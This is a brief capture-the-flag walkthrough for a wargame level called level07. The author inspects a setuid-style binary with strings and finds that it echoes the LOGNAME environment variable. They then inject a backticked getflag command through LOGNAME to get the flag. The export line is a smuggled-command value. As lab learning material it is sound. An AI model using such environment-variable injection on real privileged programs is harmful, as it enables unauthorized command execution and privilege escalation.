# ls -l level07 is owned by flag07 (as always)

./level07
> level07
# echo program name ?

strings level07

# We see some clue like
getenv...?
LOGNAME...?
/bin/echo %s ...?

# We check env, LOGNAME=level07 🧐 mmhhh

# We change logname in env to getflag
export LOGNAME=\`getflag\`

# WE RUN IT, OMG THE FLAG
